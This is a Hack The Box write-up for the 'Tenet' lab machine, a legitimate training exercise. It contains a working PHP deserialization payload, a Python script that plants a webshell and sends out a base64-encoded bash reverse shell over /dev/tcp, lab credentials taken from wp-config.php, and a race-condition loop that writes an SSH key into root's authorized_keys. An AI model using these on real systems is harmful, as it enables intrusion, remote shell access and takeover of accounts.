## HTB Tenet (Medium) - Writeup

Difficulty: Medium

On the Tenet machine, I discovered a WordPress site and found a developer comment referencing sator.php and a backup file.  
Accessing sator.php.bak revealed a PHP deserialization vulnerability, which I exploited to upload a webshell.  
I then found database credentials in wp-config.php, used them to switch to user neil.  
Finally escalated to root by abusing a race condition in a misconfigured enableSSH.sh script.  

---

## Nmap 

#### The nmap scan revealed two open ports:

![obraz](https://github.com/user-attachments/assets/b026723f-f60b-4dbe-ae80-b06ab07c9a34)


## Port 80 - Website

On port 80 we have default apache page.  

![obraz](https://github.com/user-attachments/assets/fa982757-a908-4bba-94ef-2e1f90300274)

Now we will do directory busting with feroxbuster:  
```
feroxbuster --url http://10.10.10.223
```

![obraz](https://github.com/user-attachments/assets/b2831233-0e87-476b-b2a9-e45341129a9c)

We've found wordpress directories.  
Everytime I encounter a website made in wordpress I run wpscan to look for vulnerable plugins.  
```
wpscan --url http://10.10.10.223 --plugins-detection mixed --api-token xxxxxxx
```

![obraz](https://github.com/user-attachments/assets/61d3140b-6f4d-4c32-a4c4-96f0b25fa58b)

If you don't have an api token just create an account on wpscan website and claim yours.  
We used the mixed detection method, which performs plugin brute-forcing.  
If we had relied solely on passive detection, many plugins would have been missed.  

![obraz](https://github.com/user-attachments/assets/93001081-e523-4421-a43f-4e9d65e3d087)

It has found akismet but besides that nothing of interest.  
Now I'll add tenet.htb to /etc/hosts  

![obraz](https://github.com/user-attachments/assets/2c4665bc-a354-47b8-82ec-20a96a7c2c32)

While exploring the site, I came across a comment:  

![obraz](https://github.com/user-attachments/assets/ff0e22af-9ec5-413f-8ce1-93457c24c061)

Let's look for this "sator" file.  
On tenet.htb it didn't work:  
```
http://tenet.htb/sator.php
```

But on apache default page it worked:  
```
http://10.10.10.223/sator.php
```

![obraz](https://github.com/user-attachments/assets/0eb5c304-ee2a-4919-84dd-b6dd00d77250)

They also mentioned sator backup file, let's try to retrieve it:  
```
http://10.10.10.223/sator.php.bak
```

We can download it and look at the source code:  

![obraz](https://github.com/user-attachments/assets/d05c332c-a01c-4226-adaf-ded2c34edcc7)

```php
<?php
{% raw %}
class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
{% endraw %}
```

First thing that immediately stands out is dangerous usage of unserialize function.  
This script passes user input to unserialize() which can be abused in deserialization attack.  

The script takes user input from the arepo GET parameter and passes it directly to the unserialize() function.  
This allows us to create a PHP object from user input.  
When the script finishes, PHP automatically destroys all objects, which triggers the __destruct() method of our crafted object.  
It means that __desctruct() will run against our object.  


## PHP Deserialization attack

POC payload would look like this:  
```
{% raw %} O:14:"DatabaseExport":2:{s:9:"user_file";s:8:"test.txt";s:4:"data";s:11:"Hello World";} {% endraw %}
```

It creates an object O, from class DatabaseExport, with 2 properties, first s is for string with 9 letters, then there is a value, second s is also for string, eleven is for number of letters

For it to work we need to encode it, can be done with simple script:  
```php
{% raw %}
<?php
$output = urlencode('O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"test2.txt";s:4:"data";s:11:"Hello World";}');
print $output;
?>
{% endraw %}
```
As output we get:  
```
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22test2.txt%22%3Bs%3A4%3A%22data%22%3Bs%3A11%3A%22Hello+World%22%3B%7D
```

Now we can curl this website with our payload:  

![obraz](https://github.com/user-attachments/assets/925c27b2-2e66-41f3-a97e-44a95db75cef)

Let's check if it got uploaded:  

![obraz](https://github.com/user-attachments/assets/86cf7733-50bb-4695-8396-f50bb84aaa47)

It did work, meaning we can now upload basic webshell.  
I wrote simple python script that will upload a file for us and give us basic shell access just to practice writing in python:  

```python
{% raw %}
import os
import urllib.parse
import subprocess
import base64

webshell= "<?php system($_GET['cmd']); ?>"
length = len(webshell)

payload = (
    f'O:14:"DatabaseExport":2:{{'
    f's:9:"user_file";s:5:"x.php";'
    f's:4:"data";s:{length}:"{webshell}";'
    f'}}'
)

print("[+] Encoding Payload")
encoded_payload = urllib.parse.quote(payload)
print("[+] Sending Payload")
os.system(f'curl -s "http://10.10.10.223/sator.php?arepo={encoded_payload}" > /dev/null')

print("[+] Type exit to escape this shell")
print("[+] Type rev to use automatic reverse shell")

while True:
    cmd = input("webshell> ")
    if cmd.lower() == 'exit':
        break

    url = f'http://10.10.10.223/x.php?cmd={cmd}'
    result = subprocess.run(['curl', '-s', url], capture_output=True, text=True)
    print(result.stdout)

    if cmd.lower() == 'rev':
        ip = input("your ip: ")
        port = input("your port: ")
        rev = f"bash -c 'bash  -i  >& /dev/tcp/{ip}/{port}  0>&1' &"
        enc = base64.b64encode(rev.encode()).decode()
        full = "echo " + enc + " | base64 -d  | bash"
        encoded_cmd = urllib.parse.quote(full)
        url2 = f'http://10.10.10.223/x.php?cmd={encoded_cmd}'
        subprocess.run(['curl', '-s', url2])
{% endraw %}
```

It will upload a file for us and give us an interactive shell.  
I forgot to take screenshots of this exploit usage but if we type "rev" in this shell it will give us reverse shell.  





## Priv Esc 1

When enumerating wordpress websites it's a good idea to look into wp-config.php for credentials.  

![obraz](https://github.com/user-attachments/assets/901a61b5-3a92-4d11-a5af-13bb016f206e)

![obraz](https://github.com/user-attachments/assets/385c7dd7-b4dd-4d05-b74c-cf2fbdfa9d71)

We have found credentials:  
+  neil:Opera2112


![obraz](https://github.com/user-attachments/assets/c314cc79-d998-4d6d-a01e-b673e636a58b)

Let's retrieve a flag:  

![obraz](https://github.com/user-attachments/assets/ec08085d-cf48-4f3e-826b-acf879cfa9c3)



## Priv Esc to root

One of the first things I check when looking for low hanging fruits is sudo -l:  

![obraz](https://github.com/user-attachments/assets/90034c14-146c-47d9-a832-014d5e84db64)

We can run some bash script as root:  
+ (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh

I'll paste it here:  

```
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

The script uses mktemp -u which is considered not safe.  
It prints a unique temporary filename, but does not create the file.  
Between the time you get the filename and the time you create/use the file, there is a race condition.  

This script creates a filename starting with /tmp/ssh-XXXXX  
We will look for any file that starts with /tmp/ssh- and overwrite it with our public ssh key.  

First we need to generate our public key:  

![obraz](https://github.com/user-attachments/assets/2db55117-020c-4745-918a-dcf1ac21cd01)

I wrote a script that will look for the file we want and overwrite it:  
```bash
#!/bin/bash

mykey="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC2ePU0G7oZvweezHYs9+Dr1c3bfQCCeHHILRRvF1KwL root@kali"

while true; do
    for test in /tmp/ssh-*; do
        echo "$mykey" > "$test"
        echo "Wrote key to $test"
    done
done
```

Since it's a race condition it will probably not work in the first try.  

![obraz](https://github.com/user-attachments/assets/507611e3-0ea9-442e-85ca-24db5a9f3530)


For me it took three tries, while my script was running in a loop in the second terminal.  

Now we can login with our key as root:  

![obraz](https://github.com/user-attachments/assets/e6122622-cd02-4157-a59d-089541a9312d)

Thanks for reading!  





















































